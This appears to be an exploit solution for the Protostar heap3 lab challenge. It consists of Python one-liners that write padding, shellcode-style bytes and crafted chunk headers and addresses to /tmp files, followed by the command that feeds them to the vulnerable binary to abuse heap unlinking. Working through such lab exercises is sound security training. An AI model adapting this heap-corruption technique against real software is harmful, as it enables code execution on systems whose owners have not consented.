python -c 'print "A" * 8 + "\xb8\x64\x88\x04\x08\xff\xd0"' > /tmp/A
python -c 'print "B" * 32 + "B" * 4 + "\x61"' > /tmp/B
python -c 'print "C" * 88 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x1c\xb1\x04\x08" + "\x10\xc0\x04\x08"' > /tmp/C

/opt/protostar/bin/heap3 $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
